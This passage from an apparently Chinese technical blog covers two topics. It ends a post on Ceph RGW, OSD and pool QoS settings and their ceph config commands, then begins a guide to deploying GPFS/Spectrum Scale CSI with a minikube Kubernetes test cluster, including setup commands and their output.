；</li><li><code>rgw_dmclock_data_wgt</code> : 对象数据请求的 mclock 权重，默认值为 500.0 ；</li><li><code>rgw_dmclock_data_lim</code> : 用于元数据请求的 mclock 预留，默认值为 0.0 ；</li><li><code>rgw_dmclock_metadata_res</code> : 用于元数据请求的 mclock 预留，默认值为 500.0 ；</li><li><code>rgw_dmclock_metadata_wgt</code> : 元数据请求的 mclock 权重，默认值为 500.0 ；</li><li><code>rgw_dmclock_metadata_lim</code> : 元数据请求的 mclock 限制，默认值为 0.0 ；</li></ul><p><strong>相关命令：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># get</span><br>ceph config get client.rgw rgw_dmclock_admin_res<br>ceph config get client.rgw rgw_dmclock_admin_wgt<br>ceph config get client.rgw rgw_dmclock_admin_lim<br>ceph config get client.rgw rgw_dmclock_auth_res<br>ceph config get client.rgw rgw_dmclock_auth_wgt<br>ceph config get client.rgw rgw_dmclock_auth_lim<br>ceph config get client.rgw rgw_dmclock_data_res<br>ceph config get client.rgw rgw_dmclock_data_wgt<br>ceph config get client.rgw rgw_dmclock_data_lim<br>ceph config get client.rgw rgw_dmclock_metadata_res<br>ceph config get client.rgw rgw_dmclock_metadata_wgt<br>ceph config get client.rgw rgw_dmclock_metadata_lim<br><br><span class="hljs-comment"># set</span><br>ceph config <span class="hljs-built_in">set</span> client.rgw rgw_dmclock_admin_res 101<br>......<br><br></code></pre></td></tr></table></figure><h1 id="四、OSD-QoS"><a href="#四、OSD-QoS" class="headerlink" title="四、OSD QoS"></a>四、OSD QoS</h1><p>以下分析基于 Ceph <a href="https://github.com/ceph/ceph/tree/v18.2.7">V18.2.7</a> 分支代码。</p><p><img src="/assets/images/ceph-qos-osd.png" alt="mclock osd qos" loading="lazy"></p><p><strong>相关材料：</strong></p><ul><li>Ceph OSD mclock 官方文档： <a href="https://docs.ceph.com/en/latest/rados/configuration/osd-config-ref/#dmclock-qos">https://docs.ceph.com/en/latest/rados/configuration/osd-config-ref/#dmclock-qos</a></li><li><a href="https://ceph.io/en/news/blog/2021/qos-study-with-mclock-and-wpq-schedulers/">https://ceph.io/en/news/blog/2021/qos-study-with-mclock-and-wpq-schedulers/</a></li><li><a href="https://ceph.com/en/news/blog/2022/mclock-vs-wpq-testing-with-background-ops-part1/">https://ceph.com/en/news/blog/2022/mclock-vs-wpq-testing-with-background-ops-part1/</a></li><li><a href="https://ceph.com/en/news/blog/2022/mclock-vs-wpq-testing-with-background-ops-part2/">https://ceph.com/en/news/blog/2022/mclock-vs-wpq-testing-with-background-ops-part2/</a></li><li><a href="https://docs.ceph.com/en/quincy/dev/osd_internals/mclock_wpq_cmp_study/">https://docs.ceph.com/en/quincy/dev/osd_internals/mclock_wpq_cmp_study/</a></li><li><a href="https://github.com/ceph/ceph/pull/14997">https://github.com/ceph/ceph/pull/14997</a></li><li><a href="https://github.com/ceph/ceph/pull/14330">https://github.com/ceph/ceph/pull/14330</a></li></ul><p><strong>实现特点：</strong></p><ul><li>限制粒度为 OSD 中抽象出的多种请求模式间的 QoS ， 按照 mclock 的限制规则，我们需要限制不同请求间的流量，在限制的请求中，请求类别被作为 Key ，目前 OSD Scheduler 中共引入了四种请求类别，分别是 background_recovery&#x2F;background_best_effort&#x2F;immediate&#x2F;client ， 每个操作都有与之对应的请求类别，进而每个 OSD Shard 内部可以限制不同请求类别间的 QoS ；</li><li>配置中引入了 osd_mclock_profile 参数，提供了一种配置不同请求类别间 QoS 参数的方式，详细的配置影响及关系参见相关配置中的解释；</li><li>client&#x2F;background_recovery&#x2F;background_best_effort 的 res&#x2F;wgt&#x2F;lim 配置的有效范围都是 0 到 1.0 ，这并不是实际应用在 mclock 中的参数，实际应用的值的计算公式为： <code>osd_mclock_max_sequential_bandwidth_[hdd/ssd] / osd_op_num_shards * []_res</code> 或者 <code>osd_mclock_max_sequential_bandwidth_[hdd/ssd] / osd_op_num_shards * []_lim</code> ， 这样才是每个 OSD Shard 针对不同的请求类别配置的 QoS 参数；</li></ul><p><strong>相关配置：</strong></p><ul><li><code>osd_op_queue</code> : 每个 OSD 内普通队列的操作优先级队列算法，可选值为 wpq&#x2F;mclock_scheduler&#x2F;debug_random ， 默认值为 mclock_scheduler , 无法动态修改； <ul><li><code>wpq</code> : 根据操作的优先级出队，以防止任何队列的饥饿，有助于解决一些 OSD 比其他 OSD 更过载的情况；</li><li><code>mclock_scheduler</code> : 根据操作所属的类别（恢复、擦洗、快照修剪、客户端操作、osd 子操作）来优先处理操作；</li><li><code>debug_random</code> : 随机选择以上的算法；</li></ul></li><li><code>osd_op_queue_cut_off</code> : 高优先级操作和低优先级操作之间的阈值，可选值为 low&#x2F;high&#x2F;debug_random ，默认值为 high, 无法动态修改； <ul><li><code>low</code> : 将所有复制操作及更高优先级的操作发送到严格队列，对应的具体数值为 CEPH_MSG_PRIO_LOW （64） ；</li><li><code>high</code> : 将复制确认操作及更高优先级的操作发送到严格队列，设置为 high 应该有助于当集群中的一些 OSD 非常繁忙时，特别是与 osd_op_queue 设置中的 wpq 结合使用时。非常繁忙的 OSD 处理复制流量可能会在没有这些设置的情况下饿死这些 OSD 上的主要客户端流量，对应的具体数值为 CEPH_MSG_PRIO_HIGH （196） ；</li><li><code>debug_random</code> : 随机选择以上的配置；</li></ul></li><li><code>osd_mclock_profile</code> : mclock 配置文件类型，可选值为 balanced&#x2F;high_recovery_ops&#x2F;high_client_ops&#x2F;custom ，默认值为 balanced, 无法动态修改； <ul><li><code>balanced</code> : 该模式下，client 请求类别配置为 R:0.5&#x2F;W:1&#x2F;L:0 , background_recovery 请求类别配置为 R:0.5&#x2F;W:1&#x2F;L:0 ， background_best_effort 请求类别配置为 R:0&#x2F;W:1&#x2F;L:0.9 ；</li><li><code>high_recovery_ops</code> : 该模式下，client 请求类别配置为 R:0.3&#x2F;W:1&#x2F;L:0 , background_recovery 请求类别配置为 R:0.7&#x2F;W:2&#x2F;L:0 ， background_best_effort 请求类别配置为 R:0&#x2F;W:1&#x2F;L:0 ；</li><li><code>high_client_ops</code> : 该模式下，，client 请求类别配置为 R:0.6&#x2F;W:2&#x2F;L:0 , background_recovery 请求类别配置为 R:0.4&#x2F;W:1&#x2F;L:0 ， background_best_effort 请求类别配置为 R:0&#x2F;W:1&#x2F;L:0.7 ；</li><li><code>custom</code> : 该模式下，自定义配置对应的配置；</li></ul></li><li><code>osd_mclock_scheduler_client_res</code> : 每个客户端预留的IO比例（默认），可选值的范围为 [0, 1.0] ，默认值为 0.0 ；</li><li><code>osd_mclock_scheduler_client_wgt</code> : 每个客户端的 IO 份额（默认）超过预留，默认值为 1 ；</li><li><code>osd_mclock_scheduler_client_lim</code> : 每个客户端的 IO 限制（默认）超过预留，可选值的范围为 [0, 1.0] ，默认值为 0.0 ；</li><li><code>osd_mclock_scheduler_background_recovery_res</code> : 为后台恢复保留的 IO 比例（默认），可选值的范围为 [0, 1.0] ，默认值为 0.0 ；</li><li><code>osd_mclock_scheduler_background_recovery_wgt</code> : 每次后台恢复的 IO 份额超过预留，默认值为 1 ；</li><li><code>osd_mclock_scheduler_background_recovery_lim</code> : 超出预留的后台恢复的 IO 限制，可选值的范围为 [0, 1.0] ，默认值为 0.0 ；</li><li><code>osd_mclock_scheduler_background_best_effort_res</code> : 为后台 best_effort 保留的 IO 比例（默认），可选值的范围为 [0, 1.0] ，默认值为 0.0 ；</li><li><code>osd_mclock_scheduler_background_best_effort_wgt</code> : 每个后台 best_effort 的 IO 份额超过预留，默认值为 1 ；</li><li><code>osd_mclock_scheduler_background_best_effort_lim</code> : 超过预留的后台 best_effort 的 IO 限制，可选值的范围为 [0, 1.0] ，默认值为 0.0 ；</li><li><code>osd_mclock_max_capacity_iops_hdd</code> : 每个 OSD 的最大随机写入 IOPS 容量 (在 4KiB 块大小下) (针对旋转介质)，默认值为 315 ；</li><li><code>osd_mclock_max_capacity_iops_ssd</code> : 每个 OSD 的最大随机写入 IOPS 容量 (在 4 KiB 块大小下) (针对固态介质)，默认值为 21500 ；</li><li><code>osd_mclock_max_sequential_bandwidth_hdd</code> : OSD 的最大顺序带宽，以字节&#x2F;秒为单位 (针对旋转介质)，默认值为 150M ；</li><li><code>osd_mclock_max_sequential_bandwidth_ssd</code> : OSD 的最大顺序带宽，以字节&#x2F;秒为单位 (针对固态介质)，默认值为 1200M ；</li><li><code>osd_mclock_iops_capacity_threshold_hdd</code> : 超过此 IOPS 容量阈值 (在 4KiB 块大小下) 时，将忽略 OSD 的基准测试结果 (针对旋转介质)。默认值为 500 ；</li><li><code>osd_mclock_iops_capacity_low_threshold_hdd</code> : 低于此 IOPS 容量阈值 (在 4KiB 块大小下) 时，将忽略 OSD 的基准测试结果 (针对旋转介质)。默认值为 50 ；</li><li><code>osd_mclock_iops_capacity_threshold_ssd</code> : 超过此 IOPS 容量阈值 (在 4KiB 块大小下) 时，将忽略 OSD 的基准测试结果 (针对固态介质)。默认值为 80000 ；</li><li><code>osd_mclock_iops_capacity_low_threshold_ssd</code> : 低于此 IOPS 容量阈值 (在 4KiB 块大小下) 时，将忽略 OSD 的基准测试结果 (针对固态介质)。默认值为 1000 ；</li><li><code>osd_push_per_object_cost</code> : 提供推送操作的开销，默认值为 1000B ；</li><li><code>osd_async_recovery_min_cost</code> : 当前日志条目数差异和历史丢失对象数的混合测量，高于该值时，我们会在适当时切换到使用异步恢复，默认值为 100 ；</li><li><code>osd_mclock_scheduler_anticipation_timeout</code> : mclock 预期超时时间（以秒为单位），默认值为 0 ；</li><li><code>osd_mclock_force_run_benchmark_on_init</code> : 强制在 OSD 初始化&#x2F;启动时运行 OSD 基准测试，默认值为 false ；</li><li><code>osd_mclock_skip_benchmark</code> : 在 OSD 初始化&#x2F;启动时跳过 OSD 基准测试，默认值为 false ；</li><li><code>osd_mclock_override_recovery_settings</code> : 启用对 mClock 调度器的恢复&#x2F;回填限制的覆盖，默认值为 false ；</li></ul><p><strong>相关命令：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># get</span><br>ceph tell osd.* config get osd_op_queue<br>ceph tell osd.* config get osd_op_queue_cut_off<br>ceph tell osd.* config get osd_mclock_profile<br>ceph tell osd.* config get osd_mclock_scheduler_client_res<br>ceph tell osd.* config get osd_mclock_scheduler_client_wgt<br>ceph tell osd.* config get osd_mclock_scheduler_client_lim<br>ceph tell osd.* config get osd_mclock_scheduler_background_recovery_res<br>ceph tell osd.* config get osd_mclock_scheduler_background_recovery_wgt<br>ceph tell osd.* config get osd_mclock_scheduler_background_recovery_lim<br>ceph tell osd.* config get osd_mclock_scheduler_background_best_effort_res<br>ceph tell osd.* config get osd_mclock_scheduler_background_best_effort_wgt<br>ceph tell osd.* config get osd_mclock_scheduler_background_best_effort_lim<br>ceph tell osd.* config get osd_mclock_scheduler_client_res<br>ceph tell osd.* config get osd_mclock_scheduler_client_res<br>ceph tell osd.* config get osd_mclock_scheduler_client_res<br>...<br><br><span class="hljs-comment"># set</span><br>ceph tell osd.* config <span class="hljs-built_in">set</span> osd_mclock_profile custom<br>ceph tell osd.* config <span class="hljs-built_in">set</span> osd_mclock_max_sequential_bandwidth_hdd 157286401<br>ceph tell osd.* config <span class="hljs-built_in">set</span> osd_mclock_max_sequential_bandwidth_ssd 1258291201<br></code></pre></td></tr></table></figure><h1 id="五、Pool-QoS"><a href="#五、Pool-QoS" class="headerlink" title="五、Pool QoS"></a>五、Pool QoS</h1><p>以下基于 <a href="https://github.com/ceph/ceph/pull/19340">https://github.com/ceph/ceph/pull/19340</a> 代码进行分析。</p><p><img src="/assets/images/ceph-qos-pool.png" alt="mclock pool qos" loading="lazy"></p><p><strong>相关材料：</strong></p><ul><li>相关PR: <a href="https://github.com/ceph/ceph/pull/19340">https://github.com/ceph/ceph/pull/19340</a></li></ul><p><strong>实现特点：</strong></p><ul><li>限制粒度为 OSD Shard ，即每个 OSD Shard 中都会单独限制对应 pool 的 QoS ，因此社区在测试的时候将 osd_op_num_shards 等配置设置为 1 ，在实际生产场景下需要针对 OSD Shard 的数量进行计算；</li><li>该实现基于 mclock 进行实现，采用的是 PullPriorityQueue 类；</li><li>新增的 pool 的配置需要持久化存储到 pg_pool 结构体中，因此修改了对应数据结构的编解码逻辑及版本信息；</li><li>该实现未合并到社区；</li></ul><p><strong>相关配置：</strong></p><ul><li><code>osd_op_queue</code> : OSD 中操作队列的类型，之前可选参数为 wpq&#x2F;prioritized&#x2F;mclock_opclass&#x2F;mclock_client&#x2F;debug_random ，该变动中新增了一个 mclock_pool 。默认值为 wpq ；</li><li><code>osd_pool_default_mclock_res</code> : 默认的 mclock 预留值，默认值为 0.0 ；</li><li><code>osd_pool_default_mclock_wgt</code> : 默认的 mclock 权重值，默认值为 1.0 ；</li><li><code>osd_pool_default_mclock_lim</code> : 默认的 mclock 限制值，默认值为 0.0 ；</li></ul><p><strong>相关命令：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pool name is ceph-rbd</span><br><br><span class="hljs-comment"># get</span><br>ceph osd pool get ceph-rbd qos_res<br>ceph osd pool get ceph-rbd qos_wgt<br>ceph osd pool get ceph-rbd qos_lim<br><br><span class="hljs-comment"># set</span><br>ceph osd pool <span class="hljs-built_in">set</span> ceph-rbd qos_res<br>ceph osd pool <span class="hljs-built_in">set</span> ceph-rbd qos_wgt<br>ceph osd pool <span class="hljs-built_in">set</span> ceph-rbd qos_lim<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GPFS CSI 对接 K8S 指南</title>
      <link href="/2024/09/01/gpfs-csi/"/>
      <url>/2024/09/01/gpfs-csi/</url>
      
        <content type="html"><![CDATA[<h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>GPFS CSI 指的是 GPFS（现在被称为IBM Spectrum Scale）的容器存储接口。IBM Spectrum Scale 是一种高性能的共享磁盘文件管理系统，旨在支持大规模的数据集和高吞吐量的环境，如高性能计算（HPC），大数据分析和AI工作负载。通过GPFS CSI，用户可以有效地将 Spectrum Scale 集成到 Kubernetes 这样的容器管理系统中，以实现数据的动态扩展和管理。</p><p>GPFS CSI 仓库代码: <a href="https://github.com/IBM/ibm-spectrum-scale-csi">https://github.com/IBM/ibm-spectrum-scale-csi</a></p><p><strong>本文中的机器部署拓扑:</strong></p><table><thead><tr><th align="center">机器节点</th><th align="center">机器IP地址</th><th align="center">角色</th></tr></thead><tbody><tr><td align="center">node01</td><td align="center">10.10.0.1</td><td align="center">Server&#x2F;Client&#x2F;GUI(Dashboard)</td></tr><tr><td align="center">node02</td><td align="center">10.10.0.2</td><td align="center">Server&#x2F;Client</td></tr><tr><td align="center">node03</td><td align="center">10.10.0.3</td><td align="center">Server&#x2F;Client&#x2F;minikube</td></tr></tbody></table><p>字段解释:</p><ul><li><code>Server</code>: 部署 GPFS 集群的节点；</li><li><code>Client</code>: 挂载 GPFS 数据目录的节点；</li><li><code>GUI(Dashboard)</code>: 启动 GPFS GUI 服务的节点；</li><li><code>minikube</code>: 搭建 K8S 测试集群的节点；</li></ul><h1 id="二、配置-GPFS-集群"><a href="#二、配置-GPFS-集群" class="headerlink" title="二、配置 GPFS 集群"></a>二、配置 GPFS 集群</h1><p>为了后续支持 GPFS CSI ，需要调整一些集群配置，新增关联的用户信息等操作。 以下操作总结自 <a href="https://www.ibm.com/docs/en/scalecsi/2.11.0?topic=installation-performing-pre-tasks">IBM Doc: Installation Performing Pre Tasks</a> 。</p><p><strong>相关命令:</strong> (位于 10.10.0.1 机器上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 GUI 用户</span><br>/usr/lpp/mmfs/gui/cli/lsuser<br><br><span class="hljs-comment"># 查看 GUI 用户组</span><br>/usr/lpp/mmfs/gui/cli/lsusergrp<br><br><span class="hljs-comment"># 创建 CsiAdmin 用户组(默认已经存在)</span><br>/usr/lpp/mmfs/gui/cli/mkusergrp CsiAdmin --role csiadmin<br><br><span class="hljs-comment"># 创建 csiuser 用户，使其归属于 CsiAdmin 用户组</span><br><span class="hljs-comment"># 该用户会用于 SCI 驱动程序</span><br>/usr/lpp/mmfs/gui/cli/mkuser csiuser -p csipassword -g CsiAdmin<br><br><span class="hljs-comment"># 设置配额</span><br>/usr/lpp/mmfs/bin/mmchfs defaultfs -Q <span class="hljs-built_in">yes</span><br><br><span class="hljs-comment"># 验证文件系统配置</span><br><span class="hljs-comment"># 确保 perfileset-quota 参数值为 no</span><br>/usr/lpp/mmfs/bin/mmlsfs defaultfs --filesetdf -Q --perfileset-quota<br><br><span class="hljs-comment"># 启用用户配额</span><br>/usr/lpp/mmfs/bin/mmchconfig enforceFilesetQuotaOnRoot=<span class="hljs-built_in">yes</span><br><br><span class="hljs-comment"># 对于 Red Hat OpenShift 的特定参数</span><br>/usr/lpp/mmfs/bin/mmchconfig controlSetxattrImmutableSELinux=<span class="hljs-built_in">yes</span><br><br><span class="hljs-comment"># 设置在容器中显示正确的卷大小</span><br>/usr/lpp/mmfs/bin/mmchfs defaultfs --filesetdf<br><br><span class="hljs-comment"># 启用自动 inode 扩展</span><br><span class="hljs-comment"># 该功能仅限于 IBM Storage Scale 5.1.4 及以上的版本</span><br><span class="hljs-comment"># 启用此设置后，文件集上指定的 inode-limit 设置将被忽略</span><br>/usr/lpp/mmfs/bin/mmchfs defaultfs --auto-inode-limit<br><br><span class="hljs-comment"># 确保所有 Client 节点上已经挂载 GPFS 数据目录</span><br><span class="hljs-comment"># 如果没有挂载则执行挂载操作</span><br>mmmount defaultfs /gpfsdata -N node01<br>mmmount defaultfs /gpfsdata -N node02<br>mmmount defaultfs /gpfsdata -N node03<br></code></pre></td></tr></table></figure><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@node01 data]# /usr/lpp/mmfs/bin/mmchfs defaultfs -Q <span class="hljs-built_in">yes</span><br>mmchfs: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br><br>[root@node01 data]# /usr/lpp/mmfs/bin/mmlsfs defaultfs --filesetdf -Q --perfileset-quota<br>flag                value                    description<br>------------------- ------------------------ -----------------------------------<br> --filesetdf        <span class="hljs-built_in">yes</span>                      Fileset <span class="hljs-built_in">df</span> enabled?<br> -Q                 user;group;fileset       Quotas accounting enabled<br>                    user;group;fileset       Quotas enforced<br>                    none                     Default quotas enabled<br> --perfileset-quota no                       Per-fileset quota enforcement<br><br><br>[root@node01 data]# /usr/lpp/mmfs/bin/mmchconfig enforceFilesetQuotaOnRoot=<span class="hljs-built_in">yes</span><br>mmchconfig: Command successfully completed<br>mmchconfig: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br><br>[root@node01 data]# /usr/lpp/mmfs/bin/mmchconfig controlSetxattrImmutableSELinux=<span class="hljs-built_in">yes</span><br>mmchconfig: Command successfully completed<br>mmchconfig: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br></code></pre></td></tr></table></figure><h1 id="三、搭建-K8S-集群"><a href="#三、搭建-K8S-集群" class="headerlink" title="三、搭建 K8S 集群"></a>三、搭建 K8S 集群</h1><h2 id="3-1、安装工具"><a href="#3-1、安装工具" class="headerlink" title="3.1、安装工具"></a>3.1、安装工具</h2><p>为了进行测试，这里使用 minikube 工具搭建单节点的 K8S 测试集群。为此我们需要安装 kubectl 和 minikube 工具。</p><p><strong>相关命令:</strong> (位于 10.10.0.3 机器上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装 kubectl</span><br>curl -LO <span class="hljs-string">&quot;https://dl.k8s.io/release/<span class="hljs-subst">$(curl -L -s https://dl.k8s.io/release/stable.txt)</span>/bin/linux/amd64/kubectl&quot;</span><br><span class="hljs-built_in">sudo</span> install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl<br>kubectl version --client<br><br><span class="hljs-comment"># 安装 minikube</span><br>curl -LO https://github.com/kubernetes/minikube/releases/latest/download/minikube-linux-amd64<br><span class="hljs-built_in">sudo</span> install minikube-linux-amd64 /usr/local/bin/minikube &amp;&amp; <span class="hljs-built_in">rm</span> minikube-linux-amd64<br>minikube version <br></code></pre></td></tr></table></figure><h2 id="3-2、搭建集群"><a href="#3-2、搭建集群" class="headerlink" title="3.2、搭建集群"></a>3.2、搭建集群</h2><p><strong>注意:</strong> 由于我的测试机器上使用的是 podman ，所以在使用 minikube 部署集群的时候建议使用非 root 用户执行。</p><p><strong>相关命令:</strong> (位于 10.10.0.3 机器上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 通过 minikube 搭建单节点集群</span><br><span class="hljs-comment"># 注意: 由于 minikube 是创建了虚拟机节点，因此为了能够成功启动对应的 Pod ，我们需要将对应路径 mount 到虚拟机节点内部</span><br>minikube start --mount=<span class="hljs-literal">true</span> --mount-string=<span class="hljs-string">&quot;/gpfsdata:/gpfsdata&quot;</span><br><br><span class="hljs-comment"># 查看虚拟机内部挂载目录信息</span><br>minikube ssh <span class="hljs-string">&quot;hostname; df -h&quot;</span><br><br><span class="hljs-comment"># 启动 dashboard（单独 shell 窗口执行，该命令会前台运行）</span><br>minikube dashboard --url=<span class="hljs-literal">true</span><br><br><span class="hljs-comment"># 启动 proxy 代理，用于浏览器窗口访问</span><br>kubectl proxy --port=8000 --address=<span class="hljs-string">&#x27;10.10.0.3&#x27;</span> --accept-hosts=<span class="hljs-string">&#x27;^.*&#x27;</span><br><br><span class="hljs-comment"># 浏览器访问 dashboard</span><br>http://10.10.0.3:8000/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy/<br></code></pre></td></tr></table></figure><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 data]$ minikube start --mount=<span class="hljs-literal">true</span> --mount-string=<span class="hljs-string">&quot;/gpfsdata:/gpfsdata&quot;</span><br>* minikube v1.36.0 on Centos 8.5.2111<br>==== AUTHENTICATING FOR org.libvirt.unix.manage ====<br>System policy prevents management of <span class="hljs-built_in">local</span> virtualized systems<br>Multiple identities can be used <span class="hljs-keyword">for</span> authentication:<br> 1.  admin<br> 2.  bugwz<br>Choose identity to authenticate as (1-2): 2<br>Password:<br>==== AUTHENTICATION COMPLETE ====<br>* Automatically selected the podman driver. Other choices: ssh, none<br>* Using Podman driver with root privileges<br>* Starting <span class="hljs-string">&quot;minikube&quot;</span> primary control-plane node <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;minikube&quot;</span> cluster<br>* Pulling base image v0.0.47 ...<br>E0702 21:23:25.427430 4094686 cache.go:225] Error downloading kic artifacts:  not yet implemented, see issue <span class="hljs-comment">#8426</span><br>* Creating podman container (CPUs=2, Memory=3900MB) ...<br>* Preparing Kubernetes v1.33.1 on Docker 28.1.1 ...<br>  - Generating certificates and keys ...<br>  - Booting up control plane ...<br>  - Configuring RBAC rules ...<br>* Configuring bridge CNI (Container Networking Interface) ...<br>* Verifying Kubernetes components...<br>  - Using image gcr.io/k8s-minikube/storage-provisioner:v5<br>* Enabled addons: default-storageclass, storage-provisioner<br>* Done! kubectl is now configured to use <span class="hljs-string">&quot;minikube&quot;</span> cluster and <span class="hljs-string">&quot;default&quot;</span> namespace by default<br></code></pre></td></tr></table></figure><h2 id="3-3、配置集群"><a href="#3-3、配置集群" class="headerlink" title="3.3、配置集群"></a>3.3、配置集群</h2><p>为适配 CSI 驱动，集群节点需要设置一些标签，且测试一下集群节点与 GPFS 集群 GUI 的连接是否正常。</p><p><strong>相关命令:</strong> (位于 10.10.0.3 机器上执行)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看节点信息</span><br>kubectl get nodes<br><br><span class="hljs-comment"># 由于是测试集群且只有一个节点，为此只需要标记 minikube 节点</span><br>kubectl label node minikube scale=<span class="hljs-literal">true</span> --overwrite=<span class="hljs-literal">true</span><br><br><span class="hljs-comment"># 查看节点并显示标签</span><br>kubectl get nodes --show-labels<br><br><span class="hljs-comment"># 测试网络通信是否正常</span><br><span class="hljs-comment"># 以下用户名密码为 GUI 的登录用户名和密码</span><br>curl --insecure -u <span class="hljs-string">&#x27;admin:admin..&#x27;</span> -X GET https://10.10.0.1:443/scalemgmt/v2/cluster<br></code></pre></td></tr></table></figure><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ~]$ curl --insecure -u <span class="hljs-string">&#x27;admin:admin..&#x27;</span> -X GET https://10.10.0.1:443/scalemgmt/v2/cluster<br>&#123;<br>  <span class="hljs-string">&quot;cluster&quot;</span> : &#123;<br>    <span class="hljs-string">&quot;clusterSummary&quot;</span> : &#123;<br>      <span class="hljs-string">&quot;clusterId&quot;</span> : 12883004940135644857,<br>      <span class="hljs-string">&quot;clusterName&quot;</span> : <span class="hljs-string">&quot;gpfscluster.node01&quot;</span>,<br>      <span class="hljs-string">&quot;primaryServer&quot;</span> : <span class="hljs-string">&quot;node01&quot;</span>,<br>      <span class="hljs-string">&quot;rcpPath&quot;</span> : <span class="hljs-string">&quot;/usr/bin/scp&quot;</span>,<br>      <span class="hljs-string">&quot;rcpSudoWrapper&quot;</span> : <span class="hljs-literal">false</span>,<br>      <span class="hljs-string">&quot;repositoryType&quot;</span> : <span class="hljs-string">&quot;CCR&quot;</span>,<br>      <span class="hljs-string">&quot;rshPath&quot;</span> : <span class="hljs-string">&quot;/usr/bin/ssh&quot;</span>,<br>      <span class="hljs-string">&quot;rshSudoWrapper&quot;</span> : <span class="hljs-literal">false</span>,<br>      <span class="hljs-string">&quot;uidDomain&quot;</span> : <span class="hljs-string">&quot;gpfscluster.node01&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;capacityLicensing&quot;</span> : &#123;<br>      <span class="hljs-string">&quot;liableCapacity&quot;</span> : 644245094400,<br>      <span class="hljs-string">&quot;liableNsdCount&quot;</span> : 6,<br>      <span class="hljs-string">&quot;liableNsds&quot;</span> : [ &#123;<br>        <span class="hljs-string">&quot;nsdName&quot;</span> : <span class="hljs-string">&quot;data01&quot;</span>,<br>        <span class="hljs-string">&quot;liableCapacity&quot;</span> : 107374182400<br>      &#125;, &#123;<br>        <span class="hljs-string">&quot;nsdName&quot;</span> : <span class="hljs-string">&quot;data02&quot;</span>,<br>        <span class="hljs-string">&quot;liableCapacity&quot;</span> : 107374182400<br>      &#125;, &#123;<br>        <span class="hljs-string">&quot;nsdName&quot;</span> : <span class="hljs-string">&quot;data03&quot;</span>,<br>        <span class="hljs-string">&quot;liableCapacity&quot;</span> : 107374182400<br>      &#125;, &#123;<br>        <span class="hljs-string">&quot;nsdName&quot;</span> : <span class="hljs-string">&quot;data04&quot;</span>,<br>        <span class="hljs-string">&quot;liableCapacity&quot;</span> : 107374182400<br>      &#125;, &#123;<br>        <span class="hljs-string">&quot;nsdName&quot;</span> : <span class="hljs-string">&quot;data05&quot;</span>,<br>        <span class="hljs-string">&quot;liableCapacity&quot;</span> : 107374182400<br>      &#125;, &#123;<br>        <span class="hljs-string">&quot;nsdName&quot;</span> : <span class="hljs-string">&quot;data06&quot;</span>,<br>        <span class="hljs-string">&quot;liableCapacity&quot;</span> : 107374182400<br>      &#125; ]<br>    &#125;<br>  &#125;,<br>  <span class="hljs-string">&quot;status&quot;</span> : &#123;<br>    <span class="hljs-string">&quot;code&quot;</span> : 200,<br>    <span class="hljs-string">&quot;message&quot;</span> : <span class="hljs-string">&quot;The request finished successfully.&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="四、部署-CSI-环境"><a href="#四、部署-CSI-环境" class="headerlink" title="四、部署 CSI 环境"></a>四、部署 CSI 环境</h1><p>本文的 GPFS 集群环境通过 <a href="https://bugwz.com/2024/08/01/gpfs/">GPFS 集群部署与运维记录</a> 文档进行部署，集群版本为 <code>5.1.8.1</code> ，需要根据该集群版本选择合适的 GPFS CSI 版本进行对接。参考下表，需要选择 2.11.x 版本的 CSI ，为此最终选择 <a href="https://github.com/IBM/ibm-spectrum-scale-csi/tree/v2.11.1">v2.11.1</a> 版本。 详细操作参考 <a href="https://www.ibm.com/docs/en/scalecsi/2.11.0?topic=installation-installing-storage-scale-container-storage-interface-driver-by-using-clis">IBM Doc: </a> 。</p><p><strong>IBM Storage Scale CSI 兼容性表:</strong> (以下对照表来自于 <a href="https://www.ibm.com/docs/en/scalecsi/2.14.0?topic=planning-hardware-software-requirements">IBM Doc: Planning Hardware Software Requirements</a>)</p><table><thead><tr><th align="center">CSI 版本</th><th align="center">架构</th><th align="center">IBM Storage Scale 版本</th><th align="center">OCP</th></tr></thead><tbody><tr><td align="center">2.9.0</td><td align="center">x86,ppc64le</td><td align="center">5.1.2.1 或更高版本</td><td align="center">4.10、4.11、4.12</td></tr><tr><td align="center">2.10.x</td><td align="center">x86,ppc64le</td><td align="center">5.1.2.1 或更高版本</td><td align="center">4.12、4.13、4.14</td></tr><tr><td align="center">2.11.x</td><td align="center">x86,ppc64le</td><td align="center">5.1.2.1 或更高版本</td><td align="center">4.13、4.14、4.15</td></tr><tr><td align="center">2.12.x</td><td align="center">x86,ppc64le</td><td align="center">5.1.9.x 或更高版本</td><td align="center">4.14、4.15、4.16</td></tr><tr><td align="center">2.13.x</td><td align="center">x86,ppc64le</td><td align="center">5.1.9.x 或更高版本</td><td align="center">4.15、4.16、4.17</td></tr><tr><td align="center">2.14.x</td><td 